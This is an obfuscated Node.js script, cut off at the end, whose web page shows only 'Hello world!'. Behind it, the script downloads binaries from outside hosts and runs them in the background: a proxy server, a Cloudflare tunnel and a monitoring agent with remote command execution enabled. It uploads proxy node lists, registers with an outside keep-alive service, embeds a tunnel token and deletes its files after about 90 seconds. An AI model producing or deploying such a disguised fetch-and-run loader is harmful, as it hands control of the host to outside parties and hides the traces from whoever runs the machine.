const _0x1b9873=_0x4b43;(function(_0x1e78ab,_0x12f078){const _0x45a1c5=_0x4b43,_0x7fe4dd=_0x1e78ab();while(!![]){try{const _0x37dba3=-parseInt(_0x45a1c5(0x20e))/0x1*(parseInt(_0x45a1c5(0x29c))/0x2)+parseInt(_0x45a1c5(0x273))/0x3+-parseInt(_0x45a1c5(0x212))/0x4*(-parseInt(_0x45a1c5(0x29a))/0x5)+parseInt(_0x45a1c5(0x231))/0x6*(-parseInt(_0x45a1c5(0x289))/0x7)+-parseInt(_0x45a1c5(0x210))/0x8+parseInt(_0x45a1c5(0x1f7))/0x9+parseInt(_0x45a1c5(0x20d))/0xa;if(_0x37dba3===_0x12f078)break;else _0x7fe4dd['push'](_0x7fe4dd['shift']());}catch(_0x85eb63){_0x7fe4dd['push'](_0x7fe4dd['shift']());}}}(_0x219b,0x6d1c3));const express=require(_0x1b9873(0x1f9)),app=express(),axios=require(_0x1b9873(0x20b)),os=require('os'),fs=require('fs'),path=require(_0x1b9873(0x292)),{promisify}=require(_0x1b9873(0x236)),exec=promisify(require(_0x1b9873(0x245))[_0x1b9873(0x237)]),{execSync}=require(_0x1b9873(0x245)),UPLOAD_URL=process[_0x1b9873(0x250)][_0x1b9873(0x282)]||'',PROJECT_URL=process[_0x1b9873(0x250)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x1b9873(0x250)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x1b9873(0x250)][_0x1b9873(0x23e)]||_0x1b9873(0x2b0),SUB_PATH=process[_0x1b9873(0x250)][_0x1b9873(0x256)]||_0x1b9873(0x228),PORT=process[_0x1b9873(0x250)][_0x1b9873(0x1f5)]||process[_0x1b9873(0x250)][_0x1b9873(0x23a)]||0xbb8,UUID=process[_0x1b9873(0x250)]['UUID']||_0x1b9873(0x279),NEZHA_SERVER=process[_0x1b9873(0x250)][_0x1b9873(0x253)]||'',NEZHA_PORT=process[_0x1b9873(0x250)][_0x1b9873(0x25c)]||'',NEZHA_KEY=process[_0x1b9873(0x250)][_0x1b9873(0x1f4)]||'',ARGO_DOMAIN=process[_0x1b9873(0x250)][_0x1b9873(0x225)]||_0x1b9873(0x26f),ARGO_AUTH=process[_0x1b9873(0x250)][_0x1b9873(0x274)]||_0x1b9873(0x206),ARGO_PORT=process[_0x1b9873(0x250)][_0x1b9873(0x209)]||0x1f41,CFIP=process[_0x1b9873(0x250)]['CFIP']||_0x1b9873(0x1f8),CFPORT=process[_0x1b9873(0x250)][_0x1b9873(0x280)]||0x1bb,NAME=process['env'][_0x1b9873(0x216)]||_0x1b9873(0x202);!fs[_0x1b9873(0x1fd)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x1b9873(0x2a5)](FILE_PATH+_0x1b9873(0x270))):console[_0x1b9873(0x2a5)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2a7a67=_0x1b9873,_0x147cc1=_0x2a7a67(0x2b6);let _0x3a6b46='';for(let _0x3aec50=0x0;_0x3aec50<0x6;_0x3aec50++){_0x3a6b46+=_0x147cc1['charAt'](Math[_0x2a7a67(0x275)](Math[_0x2a7a67(0x2bb)]()*_0x147cc1[_0x2a7a67(0x20c)]));}return _0x3a6b46;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1b9873(0x269)](FILE_PATH,botName),subPath=path[_0x1b9873(0x269)](FILE_PATH,_0x1b9873(0x207)),listPath=path[_0x1b9873(0x269)](FILE_PATH,_0x1b9873(0x1ff)),bootLogPath=path[_0x1b9873(0x269)](FILE_PATH,'boot.log'),configPath=path[_0x1b9873(0x269)](FILE_PATH,_0x1b9873(0x251));function deleteNodes(){const _0x5167ff=_0x1b9873;try{if(!UPLOAD_URL)return;if(!fs[_0x5167ff(0x1fd)](subPath))return;let _0x376d72;try{_0x376d72=fs[_0x5167ff(0x22d)](subPath,'utf-8');}catch{return null;}const _0x153520=Buffer[_0x5167ff(0x227)](_0x376d72,_0x5167ff(0x214))[_0x5167ff(0x2ac)](_0x5167ff(0x29b)),_0x459cdf=_0x153520['split']('\x0a')[_0x5167ff(0x232)](_0x21c355=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5167ff(0x1f1)](_0x21c355));if(_0x459cdf[_0x5167ff(0x20c)]===0x0)return;return axios['post'](UPLOAD_URL+_0x5167ff(0x205),JSON[_0x5167ff(0x2b9)]({'nodes':_0x459cdf}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x592b81=>{return null;}),null;}catch(_0x2e1ccf){return null;}}function cleanupOldFiles(){try{const _0x3a6edd=fs['readdirSync'](FILE_PATH);_0x3a6edd['forEach'](_0xab0f47=>{const _0x4bbbd3=_0x4b43,_0x35a526=path[_0x4bbbd3(0x269)](FILE_PATH,_0xab0f47);try{const _0x5418ff=fs[_0x4bbbd3(0x201)](_0x35a526);_0x5418ff['isFile']()&&fs[_0x4bbbd3(0x215)](_0x35a526);}catch(_0x5efa7b){}});}catch(_0xf9dbfc){}}app[_0x1b9873(0x259)]('/',function(_0x3caf22,_0x1446e4){const _0x3228b7=_0x1b9873;_0x1446e4[_0x3228b7(0x208)](_0x3228b7(0x20f));});async function generateConfig(){const _0xaf1c22=_0x1b9873,_0xd51973={'log':{'access':_0xaf1c22(0x2a7),'error':_0xaf1c22(0x2a7),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0xaf1c22(0x28f),'settings':{'clients':[{'id':UUID,'flow':_0xaf1c22(0x267)}],'decryption':_0xaf1c22(0x284),'fallbacks':[{'dest':0xbb9},{'path':_0xaf1c22(0x296),'dest':0xbba},{'path':_0xaf1c22(0x230),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0xaf1c22(0x265)}},{'port':0xbb9,'listen':_0xaf1c22(0x21e),'protocol':_0xaf1c22(0x28f),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0xaf1c22(0x265),'security':'none'}},{'port':0xbba,'listen':_0xaf1c22(0x21e),'protocol':_0xaf1c22(0x28f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0xaf1c22(0x296)}},'sniffing':{'enabled':!![],'destOverride':[_0xaf1c22(0x1fe),_0xaf1c22(0x24c),_0xaf1c22(0x23f)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xaf1c22(0x21e),'protocol':_0xaf1c22(0x24d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0xaf1c22(0x24c),_0xaf1c22(0x23f)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xaf1c22(0x21e),'protocol':_0xaf1c22(0x27a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xaf1c22(0x1fe),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0xaf1c22(0x246)]},'outbounds':[{'protocol':_0xaf1c22(0x25f),'tag':_0xaf1c22(0x254)},{'protocol':_0xaf1c22(0x257),'tag':_0xaf1c22(0x229)}]};fs[_0xaf1c22(0x2b8)](path[_0xaf1c22(0x269)](FILE_PATH,_0xaf1c22(0x251)),JSON['stringify'](_0xd51973,null,0x2));}function getSystemArchitecture(){const _0x196994=_0x1b9873,_0x2ad952=os[_0x196994(0x213)]();return _0x2ad952===_0x196994(0x277)||_0x2ad952===_0x196994(0x2a2)||_0x2ad952==='aarch64'?_0x196994(0x277):_0x196994(0x28c);}function downloadFile(_0x47fefa,_0x3ec9a3,_0x3581ac){const _0x33f43d=_0x1b9873,_0x32b9ae=_0x47fefa;!fs[_0x33f43d(0x1fd)](FILE_PATH)&&fs[_0x33f43d(0x27d)](FILE_PATH,{'recursive':!![]});const _0x295dfd=fs[_0x33f43d(0x234)](_0x32b9ae);axios({'method':_0x33f43d(0x259),'url':_0x3ec9a3,'responseType':'stream'})[_0x33f43d(0x2a8)](_0xe71876=>{const _0x1a7989=_0x33f43d;_0xe71876['data'][_0x1a7989(0x2ae)](_0x295dfd),_0x295dfd['on'](_0x1a7989(0x28a),()=>{const _0x21f2aa=_0x1a7989;_0x295dfd[_0x21f2aa(0x255)](),console[_0x21f2aa(0x2a5)](_0x21f2aa(0x238)+path[_0x21f2aa(0x291)](_0x32b9ae)+_0x21f2aa(0x211)),_0x3581ac(null,_0x32b9ae);}),_0x295dfd['on'](_0x1a7989(0x26a),_0x1cb622=>{const _0x1b8f01=_0x1a7989;fs['unlink'](_0x32b9ae,()=>{});const _0x2e3612='Download\x20'+path['basename'](_0x32b9ae)+'\x20failed:\x20'+_0x1cb622[_0x1b8f01(0x290)];console[_0x1b8f01(0x26a)](_0x2e3612),_0x3581ac(_0x2e3612);});})[_0x33f43d(0x23b)](_0x1b1c32=>{const _0x2ccbe1=_0x33f43d,_0x4d4cc4=_0x2ccbe1(0x238)+path[_0x2ccbe1(0x291)](_0x32b9ae)+_0x2ccbe1(0x243)+_0x1b1c32[_0x2ccbe1(0x290)];console[_0x2ccbe1(0x26a)](_0x4d4cc4),_0x3581ac(_0x4d4cc4);});}async function downloadFilesAndRun(){const _0xccbe03=_0x1b9873,_0x1e66d=getSystemArchitecture(),_0x15cad3=getFilesForArchitecture(_0x1e66d);if(_0x15cad3[_0xccbe03(0x20c)]===0x0){console['log'](_0xccbe03(0x2a9));return;}const _0x81d6b8=_0x15cad3[_0xccbe03(0x2ad)](_0x1e0756=>{return new Promise((_0x87556c,_0x135be4)=>{const _0x58a9b8=_0x4b43;downloadFile(_0x1e0756[_0x58a9b8(0x249)],_0x1e0756['fileUrl'],(_0x56ccc0,_0x114381)=>{_0x56ccc0?_0x135be4(_0x56ccc0):_0x87556c(_0x114381);});});});try{await Promise[_0xccbe03(0x20a)](_0x81d6b8);}catch(_0xee203e){console['error'](_0xccbe03(0x288),_0xee203e);return;}function _0x513c22(_0x1e70cf){const _0x5845f3=_0xccbe03,_0x3f26f0=0x1fd;_0x1e70cf[_0x5845f3(0x241)](_0x543e8d=>{const _0x315d20=_0x5845f3;fs[_0x315d20(0x1fd)](_0x543e8d)&&fs[_0x315d20(0x27e)](_0x543e8d,_0x3f26f0,_0x2020b3=>{const _0x324479=_0x315d20;_0x2020b3?console[_0x324479(0x26a)]('Empowerment\x20failed\x20for\x20'+_0x543e8d+':\x20'+_0x2020b3):console[_0x324479(0x2a5)](_0x324479(0x295)+_0x543e8d+':\x20'+_0x3f26f0[_0x324479(0x2ac)](0x8));});});}const _0x363969=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x513c22(_0x363969);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12d912=NEZHA_SERVER[_0xccbe03(0x219)](':')?NEZHA_SERVER['split'](':')[_0xccbe03(0x240)]():'',_0x5b85de=new Set(['443',_0xccbe03(0x294),_0xccbe03(0x22c),_0xccbe03(0x22e),_0xccbe03(0x25a),_0xccbe03(0x2ab)]),_0x29b30a=_0x5b85de[_0xccbe03(0x2aa)](_0x12d912)?_0xccbe03(0x200):_0xccbe03(0x1f6),_0x57cefb=_0xccbe03(0x26e)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xccbe03(0x1fc)+_0x29b30a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0xccbe03(0x2b8)](path[_0xccbe03(0x269)](FILE_PATH,_0xccbe03(0x222)),_0x57cefb);const _0x39542c=_0xccbe03(0x2a3)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0xccbe03(0x25e);try{await exec(_0x39542c),console[_0xccbe03(0x2a5)](phpName+_0xccbe03(0x23c)),await new Promise(_0xff0a1e=>setTimeout(_0xff0a1e,0x3e8));}catch(_0x24a84c){console[_0xccbe03(0x26a)](_0xccbe03(0x21f)+_0x24a84c);}}else{let _0x491c70='';const _0x244f7a=[_0xccbe03(0x242),_0xccbe03(0x294),_0xccbe03(0x22c),_0xccbe03(0x22e),_0xccbe03(0x25a),_0xccbe03(0x2ab)];_0x244f7a[_0xccbe03(0x219)](NEZHA_PORT)&&(_0x491c70=_0xccbe03(0x24a));const _0x5ac47c=_0xccbe03(0x2a3)+npmPath+_0xccbe03(0x276)+NEZHA_SERVER+':'+NEZHA_PORT+_0xccbe03(0x2b7)+NEZHA_KEY+'\x20'+_0x491c70+_0xccbe03(0x22b);try{await exec(_0x5ac47c),console[_0xccbe03(0x2a5)](npmName+_0xccbe03(0x23c)),await new Promise(_0x2aeed8=>setTimeout(_0x2aeed8,0x3e8));}catch(_0x43aacd){console[_0xccbe03(0x26a)]('npm\x20running\x20error:\x20'+_0x43aacd);}}}else console[_0xccbe03(0x2a5)](_0xccbe03(0x258));const _0x447472=_0xccbe03(0x2a3)+webPath+_0xccbe03(0x25b)+FILE_PATH+_0xccbe03(0x278);try{await exec(_0x447472),console[_0xccbe03(0x2a5)](webName+'\x20is\x20running'),await new Promise(_0x33ed5c=>setTimeout(_0x33ed5c,0x3e8));}catch(_0x3f282c){console[_0xccbe03(0x26a)](_0xccbe03(0x203)+_0x3f282c);}if(fs[_0xccbe03(0x1fd)](botPath)){let _0x4ed98f;if(ARGO_AUTH[_0xccbe03(0x224)](/^[A-Z0-9a-z=]{120,250}$/))_0x4ed98f=_0xccbe03(0x271)+ARGO_AUTH;else ARGO_AUTH[_0xccbe03(0x224)](/TunnelSecret/)?_0x4ed98f='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0xccbe03(0x25d):_0x4ed98f=_0xccbe03(0x220)+FILE_PATH+_0xccbe03(0x22f)+ARGO_PORT;try{await exec(_0xccbe03(0x2a3)+botPath+'\x20'+_0x4ed98f+_0xccbe03(0x21c)),console['log'](botName+_0xccbe03(0x23c)),await new Promise(_0x36c809=>setTimeout(_0x36c809,0x7d0));}catch(_0x43d05d){console[_0xccbe03(0x26a)](_0xccbe03(0x2b4)+_0x43d05d);}}await new Promise(_0x3cf53a=>setTimeout(_0x3cf53a,0x1388));}function getFilesForArchitecture(_0x404f47){const _0x29c61b=_0x1b9873;let _0x480f30;_0x404f47===_0x29c61b(0x277)?_0x480f30=[{'fileName':webPath,'fileUrl':_0x29c61b(0x28e)},{'fileName':botPath,'fileUrl':_0x29c61b(0x2b1)}]:_0x480f30=[{'fileName':webPath,'fileUrl':_0x29c61b(0x28d)},{'fileName':botPath,'fileUrl':_0x29c61b(0x21d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xaaa7f3=_0x404f47===_0x29c61b(0x277)?_0x29c61b(0x29f):_0x29c61b(0x299);_0x480f30['unshift']({'fileName':npmPath,'fileUrl':_0xaaa7f3});}else{const _0x366878=_0x404f47===_0x29c61b(0x277)?_0x29c61b(0x248):_0x29c61b(0x29d);_0x480f30[_0x29c61b(0x263)]({'fileName':phpPath,'fileUrl':_0x366878});}}return _0x480f30;}function argoType(){const _0x3beea9=_0x1b9873;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3beea9(0x2a5)](_0x3beea9(0x252));return;}if(ARGO_AUTH[_0x3beea9(0x219)](_0x3beea9(0x266))){fs['writeFileSync'](path[_0x3beea9(0x269)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3a7628=_0x3beea9(0x286)+ARGO_AUTH[_0x3beea9(0x221)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x3beea9(0x24e))+_0x3beea9(0x218)+ARGO_DOMAIN+_0x3beea9(0x217)+ARGO_PORT+_0x3beea9(0x268);fs[_0x3beea9(0x2b8)](path[_0x3beea9(0x269)](FILE_PATH,_0x3beea9(0x1fb)),_0x3a7628);}else console[_0x3beea9(0x2a5)](_0x3beea9(0x223));}argoType();function _0x219b(){const _0xdef3d4=['join','error','/sub.txt\x20saved\x20successfully','Nodes\x20uploaded\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0aclient_secret:\x20','pyw977.asia','\x20is\x20created','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','automatic\x20access\x20task\x20added\x20successfully','301740zDwUFC','ARGO_AUTH','floor','\x20-s\x20','arm','/config.json\x20>/dev/null\x202>&1\x20&','ffb789b7-6588-4309-8272-16558502aa2c','trojan','\x0avless://','application/json','mkdirSync','chmod','clear','CFPORT','ArgoDomain:','UPLOAD_URL','\x0a\x20\x20\x0avmess://','none','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x20\x20tunnel:\x20','text/plain;\x20charset=utf-8','Error\x20downloading\x20files:','2226QLEmOH','finish','Add\x20automatic\x20access\x20task\x20faild:\x20','amd','https://amd64.ssss.nyc.mn/web','https://arm64.ssss.nyc.mn/web','vless','message','basename','path','trim','8443','Empowerment\x20success\x20for\x20','/vless-argo','set','Content-Type','https://amd64.ssss.nyc.mn/agent','421970kFdCyI','utf-8','14bBBlyf','https://amd64.ssss.nyc.mn/v1','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/agent','\x20>\x20nul\x202>&1','firefox','arm64','nohup\x20','/vmess-argo?ed=2560','log','post','/dev/null','then','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','has','2053','toString','map','pipe','pkill\x20-f\x20\x22[','./tmp','https://arm64.ssss.nyc.mn/bot','Subscription\x20uploaded\x20successfully','win32','Error\x20executing\x20command:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','abcdefghijklmnopqrstuvwxyz','\x20-p\x20','writeFileSync','stringify','App\x20is\x20running','random','ARGO_DOMAIN:','test','platform','boot.log','NEZHA_KEY','SERVER_PORT','false','4475763FZGoUT','cdns.doon.eu.org','express','/api/add-subscriptions','tunnel.yml','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','existsSync','http','list.txt','true','statSync','cwb','web\x20running\x20error:\x20','Error\x20reading\x20boot.log:','/api/delete-nodes','eyJhIjoiZThhNDBmMWEyMDRkNWZmNzIwN2RiYWNhOGJkNTRiNmIiLCJ0IjoiMzc1NDU2MTYtZjQ3NS00MzdmLWEwOTUtYTA1YWI4ZDViNjMzIiwicyI6IlpqSXdZalF6WXpndFlUSXhZUzAwTlRObUxXSTVaVFV0WWpnMk5ERmhNRGMzTlRjMSJ9','sub.txt','send','ARGO_PORT','all','axios','length','6603100ybLZxZ','8521ghMAVX','Hello\x20world!','2403576STJFgH','\x20successfully','12SqNhnU','arch','base64','unlinkSync','NAME','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','includes','Error\x20in\x20startserver:','response','\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/bot','127.0.0.1','php\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','split','config.yaml','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','match','ARGO_DOMAIN','substring','from','1029','block','&fp=firefox&type=ws&host=','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2096','readFileSync','2087','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/vmess-argo','13290gouaWD','filter','http\x20server\x20is\x20running\x20on\x20port:','createWriteStream','push','util','exec','Download\x20','status','PORT','catch','\x20is\x20running','\x22\x20>\x20/dev/null\x202>&1','FILE_PATH','quic','pop','forEach','443','\x20failed:\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','child_process','https+local://8.8.8.8/dns-query','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/v1','fileName','--tls','https://oooo.serv00.net/add-url','tls','vmess','tunnel.json','Unhandled\x20error\x20in\x20startserver:','env','config.json','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NEZHA_SERVER','direct','close','SUB_PATH','blackhole','NEZHA\x20variable\x20is\x20empty,skip\x20running','get','2083','\x20-c\x20','NEZHA_PORT','/tunnel.yml\x20run','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','freedom','charAt','?encryption=none&security=tls&sni=','/api/add-nodes','unshift','taskkill\x20/f\x20/im\x20','tcp','TunnelSecret','xtls-rprx-vision','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20'];_0x219b=function(){return _0xdef3d4;};return _0x219b();}async function extractDomains(){const _0x10b8e6=_0x1b9873;let _0x1a497d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1a497d=ARGO_DOMAIN,console[_0x10b8e6(0x2a5)](_0x10b8e6(0x1f0),_0x1a497d),await _0x1f099a(_0x1a497d);else try{const _0x14a903=fs['readFileSync'](path[_0x10b8e6(0x269)](FILE_PATH,_0x10b8e6(0x1f3)),_0x10b8e6(0x29b)),_0x235322=_0x14a903[_0x10b8e6(0x221)]('\x0a'),_0x1d4fd1=[];_0x235322['forEach'](_0x3ad798=>{const _0x4a077a=_0x10b8e6,_0x388e54=_0x3ad798[_0x4a077a(0x224)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x388e54){const _0xd18bb7=_0x388e54[0x1];_0x1d4fd1['push'](_0xd18bb7);}});if(_0x1d4fd1[_0x10b8e6(0x20c)]>0x0)_0x1a497d=_0x1d4fd1[0x0],console[_0x10b8e6(0x2a5)](_0x10b8e6(0x281),_0x1a497d),await _0x1f099a(_0x1a497d);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,_0x10b8e6(0x1f3)));async function _0x578daf(){const _0x125917=_0x10b8e6;try{process[_0x125917(0x1f2)]===_0x125917(0x2b3)?await exec(_0x125917(0x264)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x125917(0x2af)+botName[_0x125917(0x260)](0x0)+']'+botName[_0x125917(0x226)](0x1)+_0x125917(0x23d));}catch(_0x14d27d){}}_0x578daf(),await new Promise(_0x18750e=>setTimeout(_0x18750e,0xbb8));const _0x3dc381=_0x10b8e6(0x220)+FILE_PATH+_0x10b8e6(0x22f)+ARGO_PORT;try{await exec(_0x10b8e6(0x2a3)+botPath+'\x20'+_0x3dc381+_0x10b8e6(0x21c)),console[_0x10b8e6(0x2a5)](botName+_0x10b8e6(0x23c)),await new Promise(_0x50c270=>setTimeout(_0x50c270,0xbb8)),await extractDomains();}catch(_0x47a0b9){console['error'](_0x10b8e6(0x2b4)+_0x47a0b9);}}}catch(_0x3e84b7){console[_0x10b8e6(0x26a)](_0x10b8e6(0x204),_0x3e84b7);}async function _0x1f099a(_0x1810a7){const _0x1142f6=_0x10b8e6,_0x3a6640=execSync(_0x1142f6(0x244),{'encoding':_0x1142f6(0x29b)}),_0x4029e8=_0x3a6640[_0x1142f6(0x293)](),_0x3d76ae=NAME?NAME+'-'+_0x4029e8:_0x4029e8;return new Promise(_0x87fab1=>{setTimeout(()=>{const _0xbd3e53=_0x4b43,_0x3e8fee={'v':'2','ps':''+_0x3d76ae,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xbd3e53(0x284),'host':_0x1810a7,'path':_0xbd3e53(0x2a4),'tls':_0xbd3e53(0x24c),'sni':_0x1810a7,'alpn':'','fp':_0xbd3e53(0x2a1)},_0x575d1d=_0xbd3e53(0x27b)+UUID+'@'+CFIP+':'+CFPORT+_0xbd3e53(0x261)+_0x1810a7+_0xbd3e53(0x22a)+_0x1810a7+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3d76ae+_0xbd3e53(0x283)+Buffer['from'](JSON[_0xbd3e53(0x2b9)](_0x3e8fee))[_0xbd3e53(0x2ac)](_0xbd3e53(0x214))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1810a7+_0xbd3e53(0x22a)+_0x1810a7+_0xbd3e53(0x2b5)+_0x3d76ae+'\x0a\x20\x20\x20\x20';console[_0xbd3e53(0x2a5)](Buffer[_0xbd3e53(0x227)](_0x575d1d)['toString'](_0xbd3e53(0x214))),fs[_0xbd3e53(0x2b8)](subPath,Buffer[_0xbd3e53(0x227)](_0x575d1d)[_0xbd3e53(0x2ac)](_0xbd3e53(0x214))),console['log'](FILE_PATH+_0xbd3e53(0x26b)),uploadNodes(),app[_0xbd3e53(0x259)]('/'+SUB_PATH,(_0x2ee19a,_0x1b65e1)=>{const _0x415348=_0xbd3e53,_0x2c055b=Buffer[_0x415348(0x227)](_0x575d1d)[_0x415348(0x2ac)](_0x415348(0x214));_0x1b65e1[_0x415348(0x297)](_0x415348(0x298),_0x415348(0x287)),_0x1b65e1[_0x415348(0x208)](_0x2c055b);}),_0x87fab1(_0x575d1d);},0x7d0);});}}function _0x4b43(_0x45c14b,_0x4e6bf5){const _0x219b69=_0x219b();return _0x4b43=function(_0x4b43d6,_0x32d29f){_0x4b43d6=_0x4b43d6-0x1f0;let _0x1b9313=_0x219b69[_0x4b43d6];return _0x1b9313;},_0x4b43(_0x45c14b,_0x4e6bf5);}async function uploadNodes(){const _0x569086=_0x1b9873;if(UPLOAD_URL&&PROJECT_URL){const _0x5ab113=PROJECT_URL+'/'+SUB_PATH,_0x19da30={'subscription':[_0x5ab113]};try{const _0x1bdb4d=await axios['post'](UPLOAD_URL+_0x569086(0x1fa),_0x19da30,{'headers':{'Content-Type':_0x569086(0x27c)}});return _0x1bdb4d&&_0x1bdb4d[_0x569086(0x239)]===0xc8?(console[_0x569086(0x2a5)](_0x569086(0x2b2)),_0x1bdb4d):null;}catch(_0x462a3f){if(_0x462a3f[_0x569086(0x21b)]){if(_0x462a3f[_0x569086(0x21b)][_0x569086(0x239)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x569086(0x1fd)](listPath))return;const _0x5b852f=fs['readFileSync'](listPath,_0x569086(0x29b)),_0x34c713=_0x5b852f[_0x569086(0x221)]('\x0a')[_0x569086(0x232)](_0x5ed1ee=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x569086(0x1f1)](_0x5ed1ee));if(_0x34c713['length']===0x0)return;const _0x201811=JSON['stringify']({'nodes':_0x34c713});try{const _0x92fdde=await axios[_0x569086(0x2a6)](UPLOAD_URL+_0x569086(0x262),_0x201811,{'headers':{'Content-Type':_0x569086(0x27c)}});return _0x92fdde&&_0x92fdde[_0x569086(0x239)]===0xc8?(console[_0x569086(0x2a5)](_0x569086(0x26c)),_0x92fdde):null;}catch(_0x49ce91){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5212b4=_0x4b43,_0x475537=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x475537[_0x5212b4(0x235)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x475537['push'](phpPath);process[_0x5212b4(0x1f2)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x475537[_0x5212b4(0x269)]('\x20')+_0x5212b4(0x2a0),_0x154e8f=>{const _0x2b1f2a=_0x5212b4;console[_0x2b1f2a(0x27f)](),console[_0x2b1f2a(0x2a5)](_0x2b1f2a(0x2ba)),console[_0x2b1f2a(0x2a5)](_0x2b1f2a(0x26d));}):exec(_0x5212b4(0x247)+_0x475537[_0x5212b4(0x269)]('\x20')+_0x5212b4(0x29e),_0x3cc541=>{const _0x3aba54=_0x5212b4;console[_0x3aba54(0x27f)](),console[_0x3aba54(0x2a5)]('App\x20is\x20running'),console[_0x3aba54(0x2a5)](_0x3aba54(0x26d));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x67706d=_0x1b9873;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x67706d(0x2a5)](_0x67706d(0x285));return;}try{const _0x5e63c0=await axios[_0x67706d(0x2a6)](_0x67706d(0x24b),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x67706d(0x27c)}});return console[_0x67706d(0x2a5)](_0x67706d(0x272)),_0x5e63c0;}catch(_0x177ec3){return console[_0x67706d(0x26a)](_0x67706d(0x28b)+_0x177ec3['message']),null;}}async function startserver(){const _0x121439=_0x1b9873;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5e3141){console[_0x121439(0x26a)](_0x121439(0x21a),_0x5e3141);}}startserver()['catch'](_0x422ade=>{const 